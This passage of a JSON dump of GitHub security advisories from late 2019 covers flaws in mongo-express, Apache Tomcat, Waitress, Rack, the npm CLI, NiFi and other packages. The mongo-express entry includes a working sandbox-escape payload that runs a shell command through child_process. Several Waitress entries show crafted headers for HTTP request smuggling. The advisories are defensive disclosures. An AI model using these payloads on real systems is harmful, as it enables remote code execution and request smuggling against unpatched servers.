    "description": "### Impact\n\nRemote code execution on the host machine by any authenticated user.\n\n### Proof Of Concept\n\nLaunching mongo-express on a Mac, pasting the following into the \"create index\" field will pop open the Mac calculator:\n\n```javascript\nthis.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator')\n```\n\n### Patches\nUsers should upgrade to version `0.54.0`\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n### References\n[Snyk Security Advisory](https://snyk.io/vuln/SNYK-JS-MONGOEXPRESS-473215)\n[CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10758)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)\n\n#### Thanks\n\n@JLLeitschuh for finding and reporting this vulnerability",
    "summary": "Remote Code Execution Vulnerability in NPM mongo-express"
  },
  {
    "ghsaId": "GHSA-hh3j-x4mc-g48r",
    "publishedAt": "2019-12-26T18:22:36Z",
    "description": "When Apache Tomcat 9.0.0.M1 to 9.0.28, 8.5.0 to 8.5.47, 7.0.0 and 7.0.97 is configured with the JMX Remote Lifecycle Listener, a local attacker without access to the Tomcat process or configuration files is able to manipulate the RMI registry to perform a man-in-the-middle attack to capture user names and passwords used to access the JMX interface. The attacker can then use these credentials to access the JMX interface and gain complete control over the Tomcat instance.",
    "summary": "In Apache Tomcat, a local attacker may be able to perform a man-in-the-middle attack to capture user names and passwords"
  },
  {
    "ghsaId": "GHSA-9xcj-c8cr-8c3c",
    "publishedAt": "2019-12-26T18:22:26Z",
    "description": "When using FORM authentication with Apache Tomcat 9.0.0.M1 to 9.0.29, 8.5.0 to 8.5.49 and 7.0.0 to 7.0.98 there was a narrow window where an attacker could perform a session fixation attack. The window was considered too narrow for an exploit to be practical but, erring on the side of caution, this issue has been treated as a security vulnerability.",
    "summary": "In Apache Tomcat, when using FORM authentication there was a narrow window where an attacker could perform a session fixation attack"
  },
  {
    "ghsaId": "GHSA-w457-6q6x-cgp9",
    "publishedAt": "2019-12-26T17:58:13Z",
    "description": "Versions of handlebars prior to 4.3.0 are vulnerable to Prototype Pollution leading to Remote Code Execution. Templates may alter an Object's __proto__ and __defineGetter__ properties, which may allow an attacker to execute arbitrary code through crafted payloads.",
    "summary": "Handlebars is vulnerable to Prototype Pollution leading to Remote Code Execution"
  },
  {
    "ghsaId": "GHSA-m5ff-3wj3-8ph4",
    "publishedAt": "2019-12-26T16:34:38Z",
    "description": "### Impact\r\n\r\nIf a proxy server is used in front of waitress, an invalid request may be sent by an attacker that bypasses the front-end and is parsed differently by waitress leading to a potential for HTTP request smuggling.\r\n\r\n```\r\nContent-Length: 10\r\nTransfer-Encoding: [\\x0b]chunked\r\n```\r\n\r\nFor clarity:\r\n\r\n```\r\n0x0b == vertical tab\r\n```\r\n\r\nWould get parsed by Waitress as being a `chunked` request, but a front-end server would use the `Content-Length` instead as the `Transfer-Encoding` header is considered invalid due to containing invalid characters.\r\n\r\nIf a front-end server does HTTP pipelining to a backend Waitress server this could lead to HTTP request splitting which may lead to potential cache poisoning or unexpected information disclosure.\r\n\r\n### Patches\r\n\r\nPlease upgrade to Waitress 1.4.1 which fixes this issue with stricter HTTP field validation.\r\n\r\nWaitress 1.4.1 due to this change has become much more strict in what is allowed in header values, while the maintainers don't believe that these changes will cause any issues, it may cause failures with non-conformist reverse proxies or clients, and it is highly recommend that users validate the changes in their environment and make sure it won't cause any unacceptable failures.\r\n\r\n### Workarounds\r\n\r\nYou may enable additional protections on front-end servers, those that follow RFC7230 correctly would drop the request with a 400 Bad Request.\r\n\r\nWaitress will now correctly responds to the request with a 400 Bad Request, and will drop the connection to avoid any potential HTTP pipelining issues.\r\n\r\n### References\r\n\r\nThis was mentioned in https://portswigger.net/research/http-desync-attacks-what-happened-next and was specifically mentioned as being an issue in HAProxy which did not properly filter it in this article: https://nathandavison.com/blog/haproxy-http-request-smuggling\r\n\r\n### Thanks\r\n\r\nThe Pylons Project would like to thank ZeddYu Lu for doing extended testing against Waitress 1.4.0 and bringing this to our attention!\r\n\r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory:\r\n\r\n* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)\r\n* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",
    "summary": "HTTP Request Smuggling: Invalid whitespace characters in headers in Waitress"
  },
  {
    "ghsaId": "GHSA-4ppp-gpcr-7qf6",
    "publishedAt": "2019-12-20T23:04:35Z",
    "description": "### Impact\n\nWaitress would header fold a double `Content-Length` header and due to being unable to cast the now comma separated value to an integer would set the `Content-Length` to 0 internally.\n\nSo a request with:\n\n```\nContent-Length: 10\nContent-Length: 10\n```\n\nwould get transformed to:\n\n```\nContent-Length: 10, 10\n```\n\nWhich would Waitress would then internally set to `Content-Lenght: 0`.\n\nWaitress would then treat the request as having no body, thereby treating the body of the request as a new request in HTTP pipelining.\n\n### Patches\n\nThis issue is fixed in Waitress 1.4.0. This brings a range of changes to harden Waitress against potential HTTP request confusions, and may change the behaviour of Waitress behind non-conformist proxies. \n\nThe Pylons Project recommends upgrading as soon as possible, while validating that the changes in Waitress don't cause any changes in behavior.\n\n### Workarounds\n\nVarious reverse proxies may have protections against sending potentially bad HTTP requests to the backend, and or hardening against potential issues like this. If the reverse proxy doesn't use HTTP/1.1 for connecting to the backend issues are also somewhat mitigated, as HTTP pipelining does not exist in HTTP/1.0 and Waitress will close the connection after every single request (unless the Keep Alive header is explicitly sent... so this is not a fool proof security method).\n\n### Issues/more security issues:\n\n* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)\n* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",
    "summary": "HTTP Request Smuggling: Content-Length Sent Twice in Waitress"
  },
  {
    "ghsaId": "GHSA-g2xc-35jw-c63p",
    "publishedAt": "2019-12-20T23:04:18Z",
    "description": "### Impact\n\nWaitress would parse the `Transfer-Encoding` header and only look for a single string value, if that value was not `chunked` it would fall through and use the `Content-Length` header instead.\n\nAccording to the HTTP standard `Transfer-Encoding` should be a comma separated list, with the inner-most encoding first, followed by any further transfer codings, ending with `chunked`.\n\nRequests sent with:\n\n```\nTransfer-Encoding: gzip, chunked\n```\n\nWould incorrectly get ignored, and the request would use a `Content-Length` header instead to determine the body size of the HTTP message.\n\nThis could allow for Waitress to treat a single request as multiple requests in the case of HTTP pipelining.\n\n### Patches\n\nThis issue is fixed in Waitress 1.4.0. This brings a range of changes to harden Waitress against potential HTTP request confusions, and may change the behaviour of Waitress behind non-conformist proxies. \n\nWaitress will now return a 501 Not Implemented error if the `Transfer-Encoding` is not `chunked` or contains multiple elements. Waitress does not support any transfer codings such as `gzip` or `deflate`.\n\nThe Pylons Project recommends upgrading as soon as possible, while validating that the changes in Waitress don&#39;t cause any changes in behavior.\n\n### Workarounds\n\nVarious reverse proxies may have protections against sending potentially bad HTTP requests to the backend, and or hardening against potential issues like this. If the reverse proxy doesn&#39;t use HTTP/1.1 for connecting to the backend issues are also somewhat mitigated, as HTTP pipelining does not exist in HTTP/1.0 and Waitress will close the connection after every single request (unless the Keep Alive header is explicitly sent... so this is not a fool proof security method).\n\n### Issues/more security issues:\n\n* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)\n* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",
    "summary": "HTTP Request Smuggling: Invalid Transfer-Encoding in Waitress"
  },
  {
    "ghsaId": "GHSA-pg36-wpm5-g57p",
    "publishedAt": "2019-12-20T23:03:57Z",
    "description": "### Impact\n\nWaitress implemented a &amp;quot;MAY&amp;quot; part of the RFC7230 (https://tools.ietf.org/html/rfc7230#section-3.5) which states:\n\n      Although the line terminator for the start-line and header fields is\n      the sequence CRLF, a recipient MAY recognize a single LF as a line\n      terminator and ignore any preceding CR.\n\nUnfortunately if a front-end server does not parse header fields with an LF the same way as it does those with a CRLF it can lead to the front-end and the back-end server parsing the same HTTP message in two different ways. This can lead to a potential for HTTP request smuggling/splitting whereby Waitress may see two requests while the front-end server only sees a single HTTP message.\n\nExample:\n\n```\nContent-Length: 100[CRLF]\nX-Header: x[LF]Content-Length: 0[CRLF]\n```\n\nWould get treated by Waitress as if it were:\n\n```\nContent-Length: 100\nX-Header: x\nContent-Length: 0\n```\n\nThis could potentially get used by attackers to split the HTTP request and smuggle a second request in the body of the first.\n\n\n### Patches\n\nThis issue is fixed in Waitress 1.4.0. This brings a range of changes to harden Waitress against potential HTTP request confusions, and may change the behaviour of Waitress behind non-conformist proxies. \n\nWaitress no longer implements the MAY part of the specification and instead requires that all lines are terminated correctly with CRLF. If any lines are found with a bare CR or LF a 400 Bad Request is sent back to the requesting entity.\n\nThe Pylons Project recommends upgrading as soon as possible, while validating that the changes in Waitress don&amp;#39;t cause any changes in behavior.\n\n### Workarounds\n\nVarious reverse proxies may have protections against sending potentially bad HTTP requests to the backend, and or hardening against potential issues like this. If the reverse proxy doesn&amp;#39;t use HTTP/1.1 for connecting to the backend issues are also somewhat mitigated, as HTTP pipelining does not exist in HTTP/1.0 and Waitress will close the connection after every single request (unless the Keep Alive header is explicitly sent... so this is not a fool proof security method)\n\n### Issues/more security issues:\n\n* open an issue at https://github.com/Pylons/waitress/issues (if not sensitive or security related)\n* email the Pylons Security mailing list: pylons-project-security@googlegroups.com (if security related)",
    "summary": "HTTP Request Smuggling: LF vs CRLF handling in Waitress"
  },
  {
    "ghsaId": "GHSA-hrqr-hxpp-chr3",
    "publishedAt": "2019-12-18T19:01:31Z",
    "description": "There's a possible information leak / session hijack vulnerability in Rack. Attackers may be able to find and hijack sessions by using timing attacks targeting the session id. Session ids are usually stored and indexed in a database that uses some kind of scheme for speeding up lookups of that session id. By carefully measuring the amount of time it takes to look up a session, an attacker may be able to find a valid session id and hijack the session.\n\nThe session id itself may be generated randomly, but the way the session is indexed by the backing store does not use a secure comparison.\n\n### Impact\n\nThe session id stored in a cookie is the same id that is used when querying the backing session storage engine.  Most storage mechanisms (for example a database) use some sort of indexing in order to speed up the lookup of that id.  By carefully timing requests and session lookup failures, an attacker may be able to perform a timing attack to determine an existing session id and hijack that session.\n\n## Releases\n\nThe 1.6.12 and 2.0.8 releases are available at the normal locations.\n\n### Workarounds\n\nThere are no known workarounds.\n\n### Patches\n\nTo aid users who aren't able to upgrade immediately we have provided patches for\nthe two supported release series. They are in git-am format and consist of a\nsingle changeset.\n\n* 1-6-session-timing-attack.patch - Patch for 1.6 series\n* 2-0-session-timing-attack.patch - Patch for 2.6 series\n\n### Credits\n\nThanks Will Leinweber for reporting this!",
    "summary": "Possible Information Leak / Session Hijack Vulnerability in Rack"
  },
  {
    "ghsaId": "GHSA-jc43-qrrp-98f5",
    "publishedAt": "2019-12-17T22:53:40Z",
    "description": "### Impact\n\nIt is possible to inject insert tags into the login module which will be replaced when the page is rendered.\n\n### Patches\n\nUpdate to Contao 4.8.6.\n\n### Workarounds\n\nNone.\n\n### References\n\nhttps://contao.org/en/security-advisories/insert-tag-injection-in-the-login-module.html\n\n### For more information\n\nIf you have any questions or comments about this advisory, open an issue in [contao/contao](https://github.com/contao/contao/issues/new/choose).",
    "summary": "Insert tag injection in the Contao login module"
  },
  {
    "ghsaId": "GHSA-4mvc-qc5w-v5qr",
    "publishedAt": "2019-12-17T22:53:34Z",
    "description": "### Impact\n\nBack end users can manipulate the details view URL to show pages and articles that have not been enabled for them.\n\n### Patches\n\nUpdate to Contao 4.4.46 or 4.8.6.\n\n### Workarounds\n\nNone.\n\n### References\n\nhttps://contao.org/en/security-advisories/information-disclosure-in-the-back-end.html\n\n### For more information\n\nIf you have any questions or comments about this advisory, open an issue in [contao/contao](https://github.com/contao/contao/issues/new/choose).",
    "summary": "Information disclosure in the Contao back end"
  },
  {
    "ghsaId": "GHSA-wjx8-cgrm-hh8p",
    "publishedAt": "2019-12-17T22:53:10Z",
    "description": "### Impact\n\nA back end user with access to the form generator can upload arbitrary files and execute them on the server.\n\n### Patches\n\nUpdate to Contao 4.4.46 or 4.8.6.\n\n### Workarounds\n\nConfigure your web server so it does not execute PHP files and other scripts in the Contao file upload directory.\n\n### References\n\nhttps://contao.org/en/security-advisories/unrestricted-file-uploads.html\n\n### For more information\n\nIf you have any questions or comments about this advisory, open an issue in [contao/contao](https://github.com/contao/contao/issues/new/choose).",
    "summary": "Unrestricted file uploads in Contao"
  },
  {
    "ghsaId": "GHSA-3c45-wgjp-7v9r",
    "publishedAt": "2019-12-17T22:52:34Z",
    "description": "Python Twisted 14.0 trustRoot is not respected in HTTP client",
    "summary": "A single version of twisted does not respect the trustedRoot setting"
  },
  {
    "ghsaId": "GHSA-844w-j86r-4x2j",
    "publishedAt": "2019-12-16T20:17:10Z",
    "description": "### Impact\n\nA heap buffer overflow in `UnsortedSegmentSum` can be produced when the `Index` template argument is `int32`. In this case `data_size` and `num_segments` fields are truncated from `int64` to `int32` and can produce negative numbers, resulting in accessing out of bounds heap memory.\n\nThis is unlikely to be exploitable and was detected and fixed internally. We are making the security advisory only to notify users that it is better to update to TensorFlow 1.15 or 2.0 or later as these versions already have this fixed.\n\n### Patches\n\nPatched by db4f9717c41bccc3ce10099ab61996b246099892 and released in all official releases after 1.15 and 2.0.\n\n### For more information\nPlease consult [`SECURITY.md`](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
    "summary": "Heap buffer overflow in `UnsortedSegmentSum` in TensorFlow"
  },
  {
    "ghsaId": "GHSA-q58g-455p-8vw9",
    "publishedAt": "2019-12-16T19:30:17Z",
    "description": "### Impact\nThere was a race condition around persistent connections, where a connection which is interrupted (such as by a timeout) would leave data on the socket. Subsequent requests would then read this data, returning content from the previous response. The race condition window appears to be short, and it would be difficult to purposefully exploit this.\n\n### Patches\nThe problem has been patched in 0.71.0, users should upgrade to this or a newer version (if one exists).\n\n### Workarounds\nUsers can workaround the problem by disabling persistent connections, though this may cause performance implications.\n\n### References\nSee the [patch](https://github.com/excon/excon/commit/ccb57d7a422f020dc74f1de4e8fb505ab46d8a29) for further details.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [excon/issues](https://github.com/excon/excon/issues)\n* Email us at [geemus+github@gmail.com](mailto:geemus+github@gmail.com)",
    "summary": "In RubyGem excon, interrupted Persistent Connections May Leak Response Data"
  },
  {
    "ghsaId": "GHSA-hm6q-r2jc-cpqh",
    "publishedAt": "2019-12-16T19:29:33Z",
    "description": "The lodahs package 0.0.1 for Node.js is a Trojan horse, and may have been installed by persons who mistyped the lodash package name. In particular, the Trojan horse finds and exfiltrates cryptocurrency wallets.",
    "summary": "The lodahs package for Node.js is a Trojan horse"
  },
  {
    "ghsaId": "GHSA-4328-8hgf-7wjr",
    "publishedAt": "2019-12-13T15:39:32Z",
    "description": "## Arbitrary File Overwrite\r\n\r\nVersions of  the npm CLI prior to 6.13.4 are vulnerable to an Arbitrary File Overwrite. It fails to prevent existing globally-installed binaries to be overwritten by other package installations. For example, if a package was installed globally and created a `serve` binary, any subsequent installs of packages that also create a `serve` binary would overwrite the previous `serve` binary.  \r\n\r\nThis behavior is still allowed in local installations and also through install scripts. This vulnerability bypasses a user using the --ignore-scripts install option.  \r\n\r\nThank you to Daniel Ruf for reporting the issue!\r\n\r\nFurther information: [npm blog post](https://blog.npmjs.org/post/189618601100/binary-planting-with-the-npm-cli)\r\n",
    "summary": "Arbitrary File Write in npm CLI"
  },
  {
    "ghsaId": "GHSA-x8qc-rrcw-4r46",
    "publishedAt": "2019-12-13T15:39:26Z",
    "description": "## Arbitrary File Write\r\n\r\nVersions of the npm CLI prior to 6.13.3 are vulnerable to an Arbitrary File Write. It fails to prevent access to folders outside of the intended `node_modules` folder through the `bin` field. A properly constructed entry in the package.json `bin` field would allow a package publisher to modify and/or gain access to arbitrary files on a user’s system when the package is installed.\r\n\r\nThis behavior is possible through install scripts. This vulnerability bypasses a user using the `--ignore-scripts` install option.\r\n\r\nThank you Daniel Ruf for reporting the issue!\r\n\r\nFurther information: [npm blog post](https://blog.npmjs.org/post/189618601100/binary-planting-with-the-npm-cli)\r\n",
    "summary": "Unauthorized File Access in npm CLI"
  },
  {
    "ghsaId": "GHSA-m6cx-g6qm-p2cx",
    "publishedAt": "2019-12-13T15:39:19Z",
    "description": "## Unauthorized File Access\r\n\r\nVersions of the npm CLI prior to 6.13.3 are vulnerable to an Arbitrary File Write. It is possible for packages to create symlinks to files outside of the`node_modules` folder through the `bin` field upon installation. A properly constructed entry in the package.json bin field would allow a package publisher to create a symlink pointing to arbitrary files on a user’s system when the package is installed.  \r\n\r\nThis behavior is possible through install scripts. This vulnerability bypasses a user using the --ignore-scripts install option.\r\n\r\nThank you Daniel Ruf for responsibly reporting the issue!\r\n\r\nFurther information: [npm blog post](https://blog.npmjs.org/post/189618601100/binary-planting-with-the-npm-cli)\r\n",
    "summary": "Unauthorized File Access in npm CLI"
  },
  {
    "ghsaId": "GHSA-484f-743f-6jx2",
    "publishedAt": "2019-12-12T22:50:20Z",
    "description": "## Object injection in cookie driver\r\n\r\n### Impact\r\nAn possible object injection has been discovered in cookie driver prior 5.0.13 versions (of 5.x releases).\r\n\r\n### Patches\r\nThe issue has been addressed by enforcing JSON conversion when deserializing\r\n\r\n### Workarounds\r\nIf you can't fix it, use another driver such as \"Files\" (Filesystem)\r\n\r\n### References\r\nFixing release: https://github.com/PHPSocialNetwork/phpfastcache/releases/tag/5.0.13\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [the issue tracker](https://github.com/PHPSocialNetwork/phpfastcache/issues)\r\n* Email us at [security@geolim4.com](mailto:security@geolim4.com)\r\n\r\n",
    "summary": "Object injection in cookie driver in phpfastcache"
  },
  {
    "ghsaId": "GHSA-v63x-xc9j-hhvq",
    "publishedAt": "2019-12-11T02:01:44Z",
    "description": "## Remote Code Execution Vulnerability due to Sandbox Bypass\r\n\r\n### Impact\r\n\r\n- Remote Code Execution\r\n- Cross Site Scripting\r\n\r\n### Patches\r\n\r\nThere will be no patch available.\r\n\r\n### Workarounds\r\n\r\nPlease use other packages like [vm2](https://www.npmjs.com/package/vm2).\r\n\r\n### References\r\n\r\nThe issue was originally reported to the project [vm2](https://github.com/patriksimek/vm2) by @XmiliaH in an issue [here](https://github.com/patriksimek/vm2/issues/197).\r\n\r\n\r\n",
    "summary": "Remote code execution in npm safer-eval"
  },
  {
    "ghsaId": "GHSA-3fjq-93xj-3f3f",
    "publishedAt": "2019-12-06T23:20:26Z",
    "description": "## regular expressions Cross-Site Scripting (XSS) vulnerability \r\n\r\n## Impact\r\n\r\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). It does not properly mitigate against unsafe characters in serialized regular expressions.\r\n\r\nThis vulnerability is not affected on Node.js environment since Node.js's implementation of RegExp.prototype.toString() backslash-escapes all forward slashes in regular expressions.\r\n\r\nIf serialized data of regular expression objects are used in an environment other than Node.js, it is affected by this vulnerability.\r\n\r\n## Patches\r\n\r\nThis was patched in v3.0.1.\r\n\r\n",
    "summary": "Regular expressions Cross-Site Scripting (XSS) vulnerability in serialize-to-js"
  },
  {
    "ghsaId": "GHSA-35fr-h7jr-hh86",
    "publishedAt": "2019-12-06T18:55:47Z",
    "description": "## CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')\r\n\r\nVersions of Armeria 0.85.0 through and including 0.96.0 are vulnerable to HTTP response splitting, which allows remote attackers to inject arbitrary HTTP headers via CRLF sequences when unsanitized data is used to populate the headers of an HTTP response.\r\n\r\n### Impact\r\n\r\n1. Cross-User Defacement\r\n2. Cache Poisoning\r\n3. Cross-Site Scripting (XSS)\r\n4. Page Hijacking\r\n\r\n\r\n### Root Cause\r\n\r\nThe root cause is due to the usage of Netty without the HTTP header validation.\r\n\r\nhttps://github.com/line/armeria/blob/f0d870fde1088114070be31b67f7df0a21e835c6/core/src/main/java/com/linecorp/armeria/common/DefaultHttpHeaders.java#L23\r\n\r\n### Patches\r\n\r\nThis vulnerability has been patched in 0.97.0.\r\n\r\n### References\r\n\r\n[CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https://cwe.mitre.org/data/definitions/113.html)\r\nhttps://github.com/ratpack/ratpack/security/advisories/GHSA-mvqp-q37c-wf9j\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [GitHub](https://github.com/line/armeria/issues)\r\n",
    "summary": "Moderate severity vulnerability that affects com.linecorp.armeria:armeria"
  },
  {
    "ghsaId": "GHSA-3r8j-pmch-5j2h",
    "publishedAt": "2019-12-05T19:57:04Z",
    "description": "## Internal exception message exposure for login action\r\n\r\n### Impact\r\nException messages from internal exceptions (like database exception) are wrapped by `\\Symfony\\Component\\Security\\Core\\Exception\\AuthenticationServiceException` and propagated through the system to UI. Therefore, some internal system information may leak and be visible to the customer. \r\n\r\nA validation message with the exception details will be presented to the user when one will try to log into the shop. \r\n\r\n### Patches\r\n_Has the problem been patched? What versions should users upgrade to?_\r\n\r\n### Workarounds\r\nThe `src/Sylius/Bundle/UiBundle/Resources/views/Security/_login.html.twig` file should be overridden and lines https://github.com/Sylius/Sylius/blob/1.4/src/Sylius/Bundle/UiBundle/Resources/views/Security/_login.html.twig#L13-L17 should be replaced with\r\n```twig\r\n        {% if last_error %}\r\n            <div class=\"ui left aligned basic segment\">\r\n                {{ messages.error(last_error.messageKey) }}\r\n            </div>\r\n        {% endif %}\r\n``` \r\n\r\nThe `messageKey` field should be used instead of the `message`.\r\n\r\n",
    "summary": "Internal exception message exposure for login action in Sylius"
  },
  {
    "ghsaId": "GHSA-7xx3-m584-x994",
    "publishedAt": "2019-12-05T19:26:37Z",
    "description": "## Keepalive thread overload/DoS\r\n\r\n### Impact\r\n\r\nA poorly-behaved client could use keepalive requests to monopolize Puma's reactor and create a denial of service attack.\r\n\r\nIf more keepalive connections to Puma are opened than there are threads available, additional connections will wait permanently if the attacker sends requests frequently enough.\r\n\r\n### Patches\r\n\r\nThis vulnerability is patched in Puma 4.3.1 and 3.12.2.\r\n\r\n### Workarounds\r\n\r\nReverse proxies in front of Puma could be configured to always allow less than X keepalive connections to a Puma cluster or process, where X is the number of threads configured in Puma's thread pool.\r\n\r\n### For more information\r\n\r\nIf you have any questions or comments about this advisory:\r\n\r\n* Open an issue at [puma](github.com/puma/puma).\r\n\r\n",
    "summary": "A poorly-behaved client could use keepalive requests to monopolize Puma's reactor and create a denial of service attack"
  },
  {
    "ghsaId": "GHSA-h9rv-jmmf-4pgx",
    "publishedAt": "2019-12-05T18:44:37Z",
    "description": "## regular expressions Cross-Site Scripting (XSS) vulnerability\n\n### Impact\r\n\r\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). It does not properly mitigate against unsafe characters in serialized regular expressions.\r\n\r\nThis vulnerability is not affected on Node.js environment since Node.js's implementation of `RegExp.prototype.toString()` backslash-escapes all forward slashes in regular expressions.\r\n\r\nIf serialized data of regular expression objects are used in an environment other than Node.js, it is affected by this vulnerability.\r\n\r\n### Patches\r\n\r\nThis was patched in v2.1.1.\r\n\n",
    "summary": "Moderate severity vulnerability that affects serialize-javascript"
  },
  {
    "ghsaId": "GHSA-24r8-fm9r-cpj2",
    "publishedAt": "2019-12-05T18:40:51Z",
    "description": "## Multiple timing attack vulnerabilities leading to the recovery of secrets based on the use of non-constant time compare function\n\n### Impact\n\nString comparison method in multiple authentication validation in Armeria were known to be vulnerable to timing attacks. This vulnerability is caused by the insecure implementation of `equals` method from `java.lang.String`. While this attack is not practically possible, an attacker still has a potential to attack if the victim's server validates user by using `equals` method.\n\nWe would like to thank @chrsow for pointing out the issue.\n\n## Potentially vulnerable codes\n\nhttps://github.com/line/armeria/blob/f0d870fde1088114070be31b67f7df0a21e835c6/core/src/main/java/com/linecorp/armeria/server/auth/OAuth2Token.java#L54\nhttps://github.com/line/armeria/blob/f0d870fde1088114070be31b67f7df0a21e835c6/core/src/main/java/com/linecorp/armeria/server/auth/BasicToken.java#L64\n\n### Patches\n\nThere are two options to patch this issue.\n\n1. Remove `equals` method; it has been exclusively used for test cases and was never used in any OSS projects that are using Armeria. (But it is worth noting that there are possibilities of closed projects authenticating users by utilizing `equals` method)\n\n2. Use `MessageDigest.isEqual` to compare the credential instead.\n\n### Workarounds\n\n1. Update to the latest version (TBD)\n\n2-1. Users can prevent these vulnerabilities by modifying and implementing timing attack preventions by themselves.\n\n2-2. Precisely speaking, it is possible to compare credentials by securely comparing them after calling methods to directly return the input (namely `Object. accessToken()`, `Object.username()` and `Object.password()`).\n\n### References\n- https://cwe.mitre.org/data/definitions/208.html\n- https://security.stackexchange.com/questions/111040/should-i-worry-about-remote-timing-attacks-on-string-comparison\n\n### Side Note\n\nSince it is a theoretical attack, there is no PoC available from neither the vendor nor the security team.",
    "summary": "Low severity vulnerability that affects com.linecorp.armeria:armeria"
  },
  {
    "ghsaId": "GHSA-hvmf-r92r-27hr",
    "publishedAt": "2019-12-04T21:26:28Z",
    "description": "Django 2.1 before 2.1.15 and 2.2 before 2.2.8 allows unintended model editing. A Django model admin displaying inline related models, where the user has view-only permissions to a parent model but edit permissions to the inline model, would be presented with an editing UI, allowing POST requests, for updating the inline model. Directly editing the view-only parent model was not possible, but the parent model's save() method was called, triggering potential side effects, and causing pre and post-save signal handlers to be invoked. (To resolve this, the Django admin is adjusted to require edit permissions on the parent model in order for inline models to be editable.)",
    "summary": "Django allows unintended model editing"
  },
  {
    "ghsaId": "GHSA-rh46-3fgc-mvrf",
    "publishedAt": "2019-12-04T21:25:28Z",
    "description": "In jpv (aka Json Pattern Validator) before 2.1.1, compareCommon() can be bypassed because certain internal attributes can be overwritten via a conflicting name, as demonstrated by 'constructor': {'name':'Array'}. This affects validate(). Hence, a crafted payload can overwrite this builtin attribute to manipulate the type detection result.",
    "summary": "Validation bypass is possible in Json Pattern Validator"
  },
  {
    "ghsaId": "GHSA-6xc2-mj39-q599",
    "publishedAt": "2019-12-02T18:20:41Z",
    "description": "strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.",
    "summary": "Strapi mishandles password resets"
  },
  {
    "ghsaId": "GHSA-fmqw-vqh5-cwq9",
    "publishedAt": "2019-12-02T18:19:39Z",
    "description": "When using an authentication mechanism other than PKI, when the user clicks Log Out in NiFi versions 1.0.0 to 1.9.2, NiFi invalidates the authentication token on the client side but not on the server side. This permits the user's client-side token to be used for up to 12 hours after logging out to make API requests to NiFi.",
    "summary": "Apache NiFi user log out issue"
  },
  {
    "ghsaId": "GHSA-26p8-xrj2-mv53",
    "publishedAt": "2019-12-02T18:18:37Z",
    "description": "When updating a Process Group via the API in NiFi versions 1.3.0 to 1.9.2, the response to the request includes all of its contents (at the top most level, not recursively). The response included details about processors and controller services which the user may not have had read access to.",
    "summary": "Apache NiFi process group information disclosure"
  },
  {
    "ghsaId": "GHSA-744r-vv2g-2x6g",
    "publishedAt": "2019-12-02T18:17:36Z",
    "description": "The XMLFileLookupService in NiFi versions 1.3.0 to 1.9.2 allowed trusted users to inadvertently configure a potentially malicious XML file. The XML file has the ability to make external calls to services (via XXE) and reveal information such as the versions of Java, Jersey, and Apache that the NiFI instance uses.",
    "summary": "Apache NiFi information disclosure by XXE"
  },
  {
    "ghsaId": "GHSA-4x6v-rwh4-55jw",
    "publishedAt": "2019-12-02T18:16:34Z",
    "description": "Pomelo v2.2.5 allows external control of critical state data. A malicious user input can corrupt arbitrary methods and attributes in template/game-server/app/servers/connector/handler/entryHandler.js because certain internal attributes can be overwritten via a conflicting name. Hence, a malicious attacker can manipulate internal attributes by adding additional attributes to user input.",
    "summary": "Pomelo allows external control of critical state data"
  },
  {
    "ghsaId": "GHSA-2mrj-435v-c2cr",
    "publishedAt": "2019-12-02T18:15:31Z",
    "description": "**Withdrawn:** Duplicate of GHSA-pwfw-mgfj-7g3g.",
    "summary": "possible DoS caused by malformed signature decoding in Pure-Python ECDSA"
  },
  {
    "ghsaId": "GHSA-6rjc-4pwr-3vp7",
    "publishedAt": "2019-12-02T18:14:30Z",
    "description": "Characters in the GET url path are not properly escaped and can be reflected in the server response.",
    "summary": "XSS in ioBroker.web"
  },
  {
    "ghsaId": "GHSA-5h9j-q6j2-253f",
    "publishedAt": "2019-12-02T18:13:28Z",
    "description": "In Eclipse Jetty versions 9.4.21.v20190926, 9.4.22.v20191022, and 9.4.23.v20191118, the generation of default unhandled Error response content (in text/html and text/json Content-Type) does not escape Exception messages in stacktraces included in error output.",
    "summary": "Unescaped exception messages in error responses in Jetty"
  },
  {
    "ghsaId": "GHSA-qhrx-hcm6-pmrw",
    "publishedAt": "2019-12-02T18:12:26Z",
    "description": "An issue was discovered in SmtpTransport in CakePHP 3.7.6. An unserialized object with modified internal properties can trigger arbitrary file overwriting upon destruction.",
    "summary": "Unsafe deserialization in SmtpTransport in CakePHP"
  },
  {
    "ghsaId": "GHSA-6rmq-x2hv-vxpp",
    "publishedAt": "2019-12-02T18:11:25Z",
    "description": "In Drupal Core versions 7.x prior to 7.62, 8.6.x prior to 8.6.6 and 8.5.x prior to 8.5.9; Drupal core uses the third-party PEAR Archive_Tar library. This library has released a security update which impacts some Drupal configurations. Refer to CVE-2018-1000888 for details",
    "summary": "Vulnerable third party libraries in certain configurations of Symfony"
  },
  {
    "ghsaId": "GHSA-x92h-wmg2-6hp7",
    "publishedAt": "2019-12-02T18:10:24Z",
